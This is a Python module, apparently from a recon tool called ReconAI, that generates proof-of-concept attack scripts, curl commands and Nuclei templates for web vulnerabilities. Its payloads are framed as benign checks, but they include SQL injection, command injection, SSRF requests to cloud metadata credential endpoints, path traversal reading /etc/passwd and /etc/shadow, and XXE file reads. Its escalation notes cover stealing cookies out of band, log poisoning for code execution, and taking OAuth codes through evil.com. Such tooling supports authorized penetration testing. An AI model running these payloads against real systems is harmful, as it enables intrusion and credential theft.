"""PoC Generator — Offensive Proof of Concept Code Generator.

Takes a vulnerability finding + CVE intelligence and generates:
1. A structured HTTP payload (curl/Python requests) for web vulns
2. A runnable Python PoC test script
3. A custom Nuclei template YAML for the specific endpoint
4. A Burp Suite Repeater-style raw HTTP request

This module produces BENIGN verification payloads — they confirm
the vulnerability exists but do NOT cause damage.
"""
from __future__ import annotations

import urllib.parse
from dataclasses import dataclass
from typing import Any, Callable, cast


@dataclass
class PoC:
    """A complete, structured Proof of Concept package."""
    vulnerability: str
    target: str
    curl_command: str = ""
    python_script: str = ""
    nuclei_template: str = ""
    raw_http_request: str = ""
    impact_description: str = ""
    verification_steps: list[str] | None = None


class PoCGenerator:
    """
    Generates targeted, runnable PoC scripts for confirmed vulnerabilities.

    It selects the appropriate template based on attack class (XSS, SQLi,
    SSRF, IDOR, SSTI, LFI, RCE, etc.) and populates it with the real
    target URL and parameter from the finding.
    """

    # ── Template dispatch: attack_class -> generator method ─────────────────
    _DISPATCH: dict[str, str] = {
        "xss":               "_gen_xss",
        "cross-site scripting": "_gen_xss",
        "sqli":              "_gen_sqli",
        "sql injection":     "_gen_sqli",
        "ssrf":              "_gen_ssrf",
        "server-side request forgery": "_gen_ssrf",
        "idor":              "_gen_idor",
        "insecure direct object reference": "_gen_idor",
        "ssti":              "_gen_ssti",
        "server-side template injection": "_gen_ssti",
        "lfi":               "_gen_lfi",
        "local file inclusion": "_gen_lfi",
        "rce":               "_gen_rce",
        "remote code execution": "_gen_rce",
        "open redirect":     "_gen_open_redirect",
        "xxe":               "_gen_xxe",
        "xml external entity": "_gen_xxe",
        "crlf injection":    "_gen_crlf",
        "secret":            "_gen_secret_verify",
        "exposed":           "_gen_exposed_endpoint",
        "subdomain takeover": "_gen_subdomain_takeover",
        "default":           "_gen_generic",
    }

    def generate(self, finding: dict, cve_data: dict | None = None) -> PoC:
        """Generate a PoC for the given finding dict."""
        attack_class = (finding.get("attack_class") or finding.get("title") or "").lower()
        raw_target = str(finding.get("affected_asset") or "https://target.example.com/")
        if "subdomain takeover" in attack_class:
            target = raw_target
        elif not raw_target.startswith("http://") and not raw_target.startswith("https://"):
            target = f"https://{raw_target}"
        else:
            target = raw_target
        title = finding.get("title", "Unknown Vulnerability")

        # Find best matching template
        generator_method = "_gen_generic"
        for key, method in self._DISPATCH.items():
            if key in attack_class:
                generator_method = method
                break

        gen_fn: Callable[..., PoC] = getattr(self, generator_method, self._gen_generic)
        try:
            poc: PoC = gen_fn(title, target, finding, cve_data or {})
        except Exception:
            poc = self._gen_generic(title, target, finding, cve_data or {})
        return poc

    # ═══════════════════════════════════════════════════════════════════════
    # XSS
    # ═══════════════════════════════════════════════════════════════════════
    def _gen_xss(self, title: str, target: str, finding: dict, cve: dict) -> PoC:
        canary = "<script>document.title='XSS-ReconAI-CONFIRMED'</script>"
        safe_canary = "<img src=x onerror=alert(document.domain)>"
        return PoC(
            vulnerability=title,
            target=target,
            curl_command=f'curl -sk "{target}?q={canary}" | grep -i "XSS-ReconAI"',
            python_script=f'''#!/usr/bin/env python3
"""XSS Verification PoC — ReconAI Generated"""
import requests, urllib.parse, sys

TARGET = "{target}"
CANARY = "{canary}"
SAFE_PAYLOAD = "{safe_canary}"

def check_xss(url: str, payload: str) -> bool:
    for param in ["q", "search", "query", "input", "name", "msg"]:
        r = requests.get(url, params={{param: payload}}, timeout=10, verify=False)
        if payload in r.text or "XSS-ReconAI-CONFIRMED" in r.title:
            print(f"[CONFIRMED] Reflected XSS in param: {{param}}")
            return True
    return False

if __name__ == "__main__":
    requests.packages.urllib3.disable_warnings()
    print(f"[*] Testing XSS on {{TARGET}}")
    if check_xss(TARGET, CANARY):
        print("[+] VULNERABILITY CONFIRMED")
    else:
        print("[-] Not reflected in this endpoint")
''',
            nuclei_template=f'''id: reflected-xss-recon-verify
info:
  name: Reflected XSS Verification - {target}
  author: ReconAI
  severity: high
  tags: xss,reflected

requests:
  - method: GET
    path:
      - "{{{{BaseURL}}}}?q={urllib.parse.quote(safe_canary)}"
    matchers:
      - type: word
        words:
          - "onerror=alert"
        part: body
''',
            raw_http_request=f'''GET /?q={canary} HTTP/1.1
Host: {_extract_host(target)}
User-Agent: Mozilla/5.0
Accept: text/html''',
            impact_description=(
                "An attacker can execute arbitrary JavaScript in victims' browsers. "
                "This enables session hijacking, credential theft, keylogging, and "
                "redirecting users to phishing pages."
            ),
            verification_steps=[
                f"1. Open browser devtools on: {target}",
                "2. Submit the canary payload in the affected parameter",
                "3. Confirm the script tag is reflected unescaped in the HTML response",
                "4. Escalate by stealing document.cookie via an out-of-band server",
            ],
        )

    # ═══════════════════════════════════════════════════════════════════════
    # SQL Injection
    # ═══════════════════════════════════════════════════════════════════════
    def _gen_sqli(self, title: str, target: str, finding: dict, cve: dict) -> PoC:
        return PoC(
            vulnerability=title,
            target=target,
            curl_command=(
                f"curl -sk \"{target}?id=1'\" | grep -i 'sql\\|syntax\\|mysql\\|error'"
            ),
            python_script=f'''#!/usr/bin/env python3
"""SQL Injection Verification PoC — ReconAI Generated
Uses time-based blind technique (SAFE — no data extracted)
"""
import requests, time, sys
requests.packages.urllib3.disable_warnings()

TARGET = "{target}"
DELAY_SECONDS = 5

# Time-based blind payload (non-destructive — only causes a delay)
PAYLOADS = {{
    "mysql":  "1' AND SLEEP({{d}})-- -",
    "mssql":  "1'; WAITFOR DELAY '0:0:{{d}}'--",
    "oracle": "1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(65),{{d}})--",
    "pg":     "1'; SELECT PG_SLEEP({{d}})--",
}}

def test_timebased(url: str) -> bool:
    for db, payload_tmpl in PAYLOADS.items():
        payload = payload_tmpl.format(d=DELAY_SECONDS)
        for param in ["id", "user_id", "page", "sort", "order", "cat"]:
            t0 = time.time()
            try:
                r = requests.get(url, params={{param: payload}},
                                 timeout=DELAY_SECONDS + 5, verify=False)
                elapsed = time.time() - t0
                if elapsed >= DELAY_SECONDS * 0.9:
                    print(f"[CONFIRMED] Time-based SQLi! DB={{db}} Param={{param}} Delay={{elapsed:.1f}}s")
                    return True
            except requests.Timeout:
                print(f"[CONFIRMED] Server timed out — strong indicator of SQLi (DB={{db}}, Param={{param}})")
                return True
    return False

if __name__ == "__main__":
    print(f"[*] Testing time-based SQLi on {{TARGET}} (BENIGN — no data extracted)")
    if test_timebased(TARGET):
        print("[+] VULNERABLE")
        print("[!] Next steps: Use sqlmap --technique=T for safe extraction")
    else:
        print("[-] No time-based response detected")
''',
            nuclei_template=f'''id: sqli-timebased-verify
info:
  name: SQL Injection Time-Based Verification - {target}
  author: ReconAI
  severity: critical
  tags: sqli

requests:
  - method: GET
    path:
      - "{{{{BaseURL}}}}?id=1'%20AND%20SLEEP(5)--%20-"
    matchers:
      - type: dsl
        dsl:
          - "duration >= 5"
''',
            impact_description=(
                "An attacker can extract the entire database (usernames, passwords, PII, "
                "credit card data). With stacked queries or FILE privileges, this can "
                "escalate to full Remote Code Execution on the database server."
            ),
            verification_steps=[
                "1. Run this script — a 5-second response delay CONFIRMS the vulnerability",
                "2. Run: sqlmap -u TARGET --dbs --technique=T --safe-req to enumerate dbs",
                "3. STOP before extracting real data without written authorization",
            ],
        )

    # ═══════════════════════════════════════════════════════════════════════
    # SSRF
    # ═══════════════════════════════════════════════════════════════════════
    def _gen_ssrf(self, title: str, target: str, finding: dict, cve: dict) -> PoC:
        interactsh_url = "REPLACE_WITH_YOUR_INTERACTSH_OR_BURP_COLLABORATOR_URL"
        return PoC(
            vulnerability=title,
            target=target,
            curl_command=(
                f'curl -sk "{target}?url=http://169.254.169.254/latest/meta-data/" | head -20'
            ),
            python_script=f'''#!/usr/bin/env python3
"""SSRF Verification PoC — ReconAI Generated"""
import requests
requests.packages.urllib3.disable_warnings()

TARGET = "{target}"
# AWS IMDSv1 — returns instance metadata if server is on AWS
AWS_IMDS = "http://169.254.169.254/latest/meta-data/"
GCP_IMDS = "http://metadata.google.internal/computeMetadata/v1/"
AZURE_IMDS = "http://169.254.169.254/metadata/instance"
OOB_URL = "{interactsh_url}"  # Replace with Burp Collaborator or interactsh.com URL

SSRF_PARAMS = ["url", "dest", "redirect", "uri", "path", "src", "source", "callback", "host"]

def test_ssrf(url: str) -> None:
    for param in SSRF_PARAMS:
        # Test 1: AWS IMDS (confirms SSRF + leaks cloud metadata)
        try:
            r = requests.get(url, params={{param: AWS_IMDS}}, timeout=8, verify=False)
            if any(kw in r.text.lower() for kw in ["ami-id", "instance-id", "iam"]):
                print(f"[CRITICAL] AWS IMDS SSRF CONFIRMED via param={{param}}")
                print(f"[+] Server response snippet: {{r.text[:300]}}")
                return
        except Exception:
            pass

        # Test 2: Out-of-band (use Burp Collaborator or interactsh)
        print(f"[*] Testing OOB SSRF via param={{param}} -> {{OOB_URL}}")
        try:
            requests.get(url, params={{param: OOB_URL}}, timeout=5, verify=False)
        except Exception:
            pass
    print("[*] Check your OOB collaborator for DNS/HTTP callbacks")

if __name__ == "__main__":
    print(f"[*] Testing SSRF on {{TARGET}}")
    test_ssrf(TARGET)
''',
            impact_description=(
                "SSRF allows an attacker to make the server issue arbitrary HTTP requests. "
                "On cloud infrastructure, this typically leads to cloud credential theft "
                "via IMDSv1 (AWS/GCP/Azure), internal service enumeration, and lateral movement."
            ),
            verification_steps=[
                "1. Set up Burp Collaborator or interactsh.com and get a URL",
                "2. Replace OOB_URL in script and run",
                "3. Check collaborator for DNS callbacks",
                "4. Test AWS IMDS: curl TARGET?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            ],
        )

    # ═══════════════════════════════════════════════════════════════════════
    # SSTI
    # ═══════════════════════════════════════════════════════════════════════
    def _gen_ssti(self, title: str, target: str, finding: dict, cve: dict) -> PoC:
        return PoC(
            vulnerability=title,
            target=target,
            curl_command=f"curl -sk \"{target}?name={{{{7*7}}}}\" | grep -o '49'",
            python_script=f'''#!/usr/bin/env python3
"""SSTI Verification PoC — ReconAI Generated"""
import requests
requests.packages.urllib3.disable_warnings()

TARGET = "{target}"

# Canary payloads for different template engines
PAYLOADS = {{
    "Jinja2 (Flask/Python)":   "{{{{7*7}}}}",
    "Twig (PHP)":              "{{{{7*7}}}}",
    "Freemarker (Java)":       "${{7*7}}",
    "Smarty (PHP)":            "{{7*7}}",
    "Velocity (Java)":         "#set($x=7*7)${{x}}",
    "Mako (Python)":           "${{7*7}}",
}}

for engine, payload in PAYLOADS.items():
    for param in ["name", "template", "msg", "text", "search", "input"]:
        try:
            r = requests.get(TARGET, params={{param: payload}}, timeout=10, verify=False)
            if "49" in r.text:
                print(f"[CONFIRMED] SSTI via {{engine}} — param={{param}}")
                print(f"[+] 7*7 = 49 reflected in response!")
                break
        except Exception:
            pass
''',
            impact_description=(
                "SSTI gives an attacker the ability to execute arbitrary code on the server. "
                "In Jinja2/Python, this can be escalated to full OS command execution via "
                "config.__class__.__mro__[1].__subclasses__() gadget chains."
            ),
            verification_steps=[
                "1. Submit {{7*7}} in all input parameters",
                "2. If '49' appears in the response body, SSTI is confirmed",
                "3. Escalate using engine-specific RCE payloads (see PayloadAllTheThings)",
            ],
        )

    # ═══════════════════════════════════════════════════════════════════════
    # IDOR
    # ═══════════════════════════════════════════════════════════════════════
    def _gen_idor(self, title: str, target: str, finding: dict, cve: dict) -> PoC:
        return PoC(
            vulnerability=title,
            target=target,
            curl_command=f'curl -sk -H "Cookie: session=REPLACE_COOKIE" "{target}" | grep -E "(user_id|account|profile|email|admin)"',
            python_script=f'''#!/usr/bin/env python3
"""IDOR Enumeration PoC — ReconAI Generated
IMPORTANT: Only run against your OWN accounts or with written authorization.
"""
import requests
requests.packages.urllib3.disable_warnings()

TARGET = "{target}"
# Replace with a valid session cookie from YOUR account
SESSION_COOKIE = {{  "session": "YOUR_COOKIE_HERE" }}

# Enumerate adjacent IDs to check if other users' data is returned
YOUR_USER_ID = 1000   # Replace with your actual user ID

for user_id in range(YOUR_USER_ID - 5, YOUR_USER_ID + 5):
    url = TARGET.replace(str(YOUR_USER_ID), str(user_id))
    r = requests.get(url, cookies=SESSION_COOKIE, timeout=10, verify=False)
    print(f"ID={{user_id}} | Status={{r.status_code}} | Size={{len(r.content)}} bytes")
    if r.status_code == 200 and user_id != YOUR_USER_ID:
        print(f"  [!] POSSIBLE IDOR — Response for ID {{user_id}} returned 200 OK")
''',
            impact_description=(
                "IDOR allows an attacker to access data belonging to other users by "
                "manipulating object references (IDs). This can expose PII, financial data, "
                "private messages, and account settings of all users."
            ),
            verification_steps=[
                "1. Create two test accounts (Account A and Account B)",
                "2. With Account A's session cookie, request Account B's resource ID",
                "3. If Account B's data is returned, IDOR is confirmed",
            ],
        )

    # ═══════════════════════════════════════════════════════════════════════
    # LFI
    # ═══════════════════════════════════════════════════════════════════════
    def _gen_lfi(self, title: str, target: str, finding: dict, cve: dict) -> PoC:
        return PoC(
            vulnerability=title,
            target=target,
            curl_command=(
                f"curl -sk \"{target}?file=../../../../etc/passwd\" | grep 'root:'"
            ),
            python_script=f'''#!/usr/bin/env python3
"""LFI Verification PoC — ReconAI Generated"""
import requests
requests.packages.urllib3.disable_warnings()

TARGET = "{target}"
TARGETS_FILES = ["/etc/passwd", "/etc/shadow", "/proc/self/environ",
                 "C:/Windows/System32/drivers/etc/hosts"]
TRAVERSALS = ["../", "..%2f", "..%252f", "....//", "%2e%2e/"]
LFI_PARAMS = ["file", "page", "path", "include", "template", "load", "doc", "read"]

for param in LFI_PARAMS:
    for target_file in TARGETS_FILES[:2]:  # Test /etc/passwd first
        for traversal in TRAVERSALS:
            payload = (traversal * 6) + target_file.lstrip("/")
            try:
                r = requests.get(TARGET, params={{param: payload}}, timeout=8, verify=False)
                if "root:" in r.text or "WINDOWS" in r.text:
                    print(f"[CONFIRMED] LFI! param={{param}}, payload={{payload}}")
                    print(r.text[:500])
                    exit(0)
            except Exception:
                pass
print("[-] No LFI detected in common params")
''',
            impact_description=(
                "LFI allows reading arbitrary files from the server filesystem. "
                "This enables reading /etc/passwd, private SSH keys, application config "
                "files with database credentials, and can escalate to RCE via log poisoning."
            ),
            verification_steps=[
                "1. Run curl test — if /etc/passwd content appears, confirmed",
                "2. Try /proc/self/environ to read environment variables (often contains secrets)",
                "3. Escalate to RCE: poison Apache/Nginx log files with PHP code, then include them",
            ],
        )

    # ═══════════════════════════════════════════════════════════════════════
    # RCE
    # ═══════════════════════════════════════════════════════════════════════
    def _gen_rce(self, title: str, target: str, finding: dict, cve: dict) -> PoC:
        return PoC(
            vulnerability=title,
            target=target,
            curl_command=f'curl -sk "{target}?cmd=id" | grep -E "(uid=[0-9]+|gid=[0-9]+|groups=)"',
            python_script=f'''#!/usr/bin/env python3
"""RCE Verification PoC — ReconAI Generated
SAFE: Uses `id` command only — no reverse shell, no persistence.
"""
import requests
requests.packages.urllib3.disable_warnings()

TARGET = "{target}"
SAFE_CMD = "id"   # Returns uid/gid only — benign

# Common RCE parameter names
RCE_PARAMS = ["cmd", "exec", "command", "shell", "ping", "run", "c", "q"]
COMMON_DELIMITERS = [";", "|", "`", "$(", "&&", "||", "%0a", "%3b"]

for param in RCE_PARAMS:
    for delim in COMMON_DELIMITERS:
        payload = f"ls{{delim}}{{SAFE_CMD}}"
        try:
            r = requests.get(TARGET, params={{param: payload}}, timeout=8, verify=False)
            if any(kw in r.text for kw in ["uid=", "root", "www-data", "apache"]):
                print(f"[CONFIRMED] RCE via param={{param}} delim={{delim}}")
                print(f"[+] Server response: {{r.text[:300]}}")
                exit(0)
        except Exception:
            pass
print("[-] No RCE detected with safe payloads")
''',
            impact_description=(
                "Remote Code Execution gives complete control over the server. An attacker "
                "can install backdoors, exfiltrate all data, pivot to internal networks, "
                "and use the server as a launching pad for further attacks."
            ),
            verification_steps=[
                "1. Run `id` command — if uid= appears in response, RCE is confirmed",
                "2. STOP and report immediately — do not install reverse shells",
                "3. Take screenshots and HTTP response evidence for the report",
            ],
        )

    # ═══════════════════════════════════════════════════════════════════════
    # Open Redirect
    # ═══════════════════════════════════════════════════════════════════════
    def _gen_open_redirect(self, title: str, target: str, finding: dict, cve: dict) -> PoC:
        return PoC(
            vulnerability=title,
            target=target,
            curl_command=(
                f"curl -sk -I \"{target}?next=https://evil.com\" | grep -i location"
            ),
            python_script=f'''#!/usr/bin/env python3
"""Open Redirect Verification PoC — ReconAI Generated"""
import requests
requests.packages.urllib3.disable_warnings()

TARGET = "{target}"
EVIL = "https://portswigger.net"  # benign redirect target

PARAMS = ["next", "redirect", "url", "return", "returnTo", "returnUrl",
          "goto", "dest", "destination", "r", "u", "target"]

for param in PARAMS:
    r = requests.get(TARGET, params={{param: EVIL}}, allow_redirects=False,
                     timeout=8, verify=False)
    loc = r.headers.get("Location", "")
    if "portswigger" in loc.lower():
        print(f"[CONFIRMED] Open Redirect via param={{param}}")
        print(f"[+] Location: {{loc}}")
''',
            impact_description=(
                "Open Redirect can be used as a phishing vector to trick users into "
                "visiting malicious sites while appearing to come from a trusted domain. "
                "Combined with OAuth, it can lead to account takeover."
            ),
            verification_steps=[
                "1. Click link that redirects to evil.com via trusted domain",
                "2. The user sees xyz.com in their browser before being redirected",
                "3. Use in OAuth flows to steal authorization codes",
            ],
        )

    # ═══════════════════════════════════════════════════════════════════════
    # XXE
    # ═══════════════════════════════════════════════════════════════════════
    def _gen_xxe(self, title: str, target: str, finding: dict, cve: dict) -> PoC:
        payload = '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
        return PoC(
            vulnerability=title,
            target=target,
            curl_command=(
                f"curl -sk -X POST {target} -H 'Content-Type: application/xml' "
                f"-d '{payload}' | grep 'root:'"
            ),
            python_script=f'''#!/usr/bin/env python3
"""XXE Verification PoC — ReconAI Generated"""
import requests
requests.packages.urllib3.disable_warnings()

TARGET = "{target}"
XXE_PAYLOAD = """{payload}"""

r = requests.post(TARGET, data=XXE_PAYLOAD,
                  headers={{"Content-Type": "application/xml"}},
                  timeout=10, verify=False)
if "root:" in r.text:
    print("[CONFIRMED] XXE — /etc/passwd content returned!")
    print(r.text[:500])
else:
    print("[-] No direct XXE response. Try OOB: replace SYSTEM with your Burp Collaborator URL")
''',
            impact_description=(
                "XXE allows reading arbitrary server files and, in some parsers, executing SSRF. "
                "This typically exposes /etc/passwd, application configs with credentials, and "
                "can pivot to full SSRF on internal networks."
            ),
            verification_steps=[
                "1. Submit XML with DOCTYPE entity pointing to file:///etc/passwd",
                "2. If file contents appear in response, XXE is confirmed",
                "3. For blind XXE: use OOB technique with Burp Collaborator",
            ],
        )

    def _gen_crlf(self, title: str, target: str, finding: dict, cve: dict) -> PoC:
        return PoC(
            vulnerability=title,
            target=target,
            curl_command=f'curl -sk -I "{target}?q=%0d%0aX-Injected-Header:pwned" | grep -i injected',
            python_script=f'''#!/usr/bin/env python3
"""CRLF Injection Verification PoC — ReconAI Generated"""
import requests
requests.packages.urllib3.disable_warnings()

TARGET = "{target}"
payload = "%0d%0aSet-Cookie: reconai_canary=1"
try:
    r = requests.get(f"{{TARGET}}?param={{payload}}", timeout=10, verify=False, allow_redirects=False)
    if "reconai_canary" in r.headers.get("Set-Cookie", ""):
        print("[CONFIRMED] CRLF Injection — Injected header set in response!")
    else:
        print("[-] Injected header not reflected in Set-Cookie.")
except Exception as e:
    print(f"[-] Connection error: {{e}}")
''',
            impact_description="CRLF injection allows injecting HTTP headers, enabling session fixation, XSS via header injection, and HTTP response splitting.",
            verification_steps=[
                "1. Send request with %0d%0a carriage-return newline sequences",
                "2. Check response headers for injected HTTP headers or cookies",
                "3. If Set-Cookie or custom header is reflected, CRLF injection is confirmed",
            ],
        )

    def _gen_secret_verify(self, title: str, target: str, finding: dict, cve: dict) -> PoC:
        return PoC(
            vulnerability=title,
            target=target,
            curl_command=f'curl -sk -H "Authorization: Bearer REPLACE_WITH_DISCOVERED_KEY" "{target}" | head -30',
            python_script=f'''#!/usr/bin/env python3
"""Exposed Secret Verification PoC — ReconAI Generated
Verifies that an exposed API key/credential is VALID (without using it destructively).
"""
import requests
requests.packages.urllib3.disable_warnings()

# !! Replace with the actual key found by Trufflehog
EXPOSED_KEY = "REPLACE_WITH_DISCOVERED_KEY"
TARGET = "{target}"

# Test AWS key
import subprocess, json
try:
    result = subprocess.run(
        ["aws", "sts", "get-caller-identity", "--query", "Account", "--output", "json"],
        env={{"AWS_ACCESS_KEY_ID": EXPOSED_KEY.split(":")[0],
              "AWS_SECRET_ACCESS_KEY": EXPOSED_KEY.split(":")[-1]}},
        capture_output=True, text=True, timeout=10
    )
    if result.returncode == 0:
        print(f"[CRITICAL] Valid AWS credentials confirmed! Account: {{result.stdout.strip()}}")
except Exception as e:
    print(f"Not AWS or error: {{e}}")
''',
            impact_description="Exposed credentials grant direct access to the service. An attacker can use them to access data, services, or cloud infrastructure directly.",
            verification_steps=[
                "1. Verify key format and corresponding provider",
                "2. Submit benign read-only identity probe (e.g. sts get-caller-identity or /user endpoint)",
                "3. Confirm key validity without performing destructive actions",
            ],
        )

    def _gen_exposed_endpoint(self, title: str, target: str, finding: dict, cve: dict) -> PoC:
        return PoC(
            vulnerability=title,
            target=target,
            curl_command=f'curl -sk -v "{target}" 2>&1 | head -40',
            python_script=f'''#!/usr/bin/env python3
"""Exposed Endpoint Verification PoC — ReconAI Generated"""
import requests
requests.packages.urllib3.disable_warnings()

TARGET = "{target}"
try:
    r = requests.get(TARGET, timeout=10, verify=False)
    print(f"Status: {{r.status_code}} | Length: {{len(r.content)}} bytes")
    if r.status_code == 200:
        print("[CONFIRMED] Sensitive endpoint accessible without authentication!")
        print(r.text[:500])
    else:
        print(f"[-] Status code: {{r.status_code}}")
except Exception as e:
    print(f"[-] Error: {{e}}")
''',
            impact_description="An exposed sensitive endpoint may leak configuration, user data, or provide unauthorized access to administrative functions.",
            verification_steps=[
                f"1. Send GET request to: {target}",
                "2. Check if HTTP 200 OK is returned without requiring authentication credentials",
                "3. Review response body for exposed tokens, internal APIs, or PII",
            ],
        )

    def _gen_subdomain_takeover(self, title: str, target: str, finding: dict, cve: dict) -> PoC:
        pure_host = _extract_host(target)
        return PoC(
            vulnerability=title,
            target=target,
            python_script=f'''#!/usr/bin/env python3
"""Subdomain Takeover Verification PoC — ReconAI Generated"""
import socket, requests

TARGET_SUBDOMAIN = "{pure_host}"
print(f"[*] Resolving {{TARGET_SUBDOMAIN}}")
try:
    ip = socket.gethostbyname(TARGET_SUBDOMAIN)
    print(f"[*] Resolved to: {{ip}}")
except socket.gaierror:
    print("[!] DNS resolution failed — subdomain may already be unclaimed (dangling DNS)")

r = requests.get(f"https://{{TARGET_SUBDOMAIN}}", timeout=10, verify=False)
for indicator in ["NoSuchBucket", "There is no app configured at that hostname",
                  "404 Not Found", "Repository not found", "herokucdn"]:
    if indicator.lower() in r.text.lower():
        print(f"[CONFIRMED] Takeover possible! Indicator found: {{indicator}}")
        break
''',
            impact_description="A dangling CNAME to an unclaimed service allows an attacker to register the service under the vulnerable subdomain, serving malicious content from a trusted domain.",
        )

    def _gen_generic(self, title: str, target: str, finding: dict, cve: dict) -> PoC:
        return PoC(
            vulnerability=title,
            target=target,
            curl_command=f'curl -sk -v "{target}" | head -50',
            python_script=f'''#!/usr/bin/env python3
"""Generic Vulnerability Probe — ReconAI Generated"""
import requests
requests.packages.urllib3.disable_warnings()
r = requests.get("{target}", timeout=10, verify=False)
print(f"Status: {{r.status_code}}")
print(f"Headers: {{dict(r.headers)}}")
print(f"Body (first 500 chars): {{r.text[:500]}}")
''',
            impact_description=finding.get("impact", ""),
        )


def _extract_host(url: str) -> str:
    parsed = urllib.parse.urlparse(url)
    return parsed.netloc or url
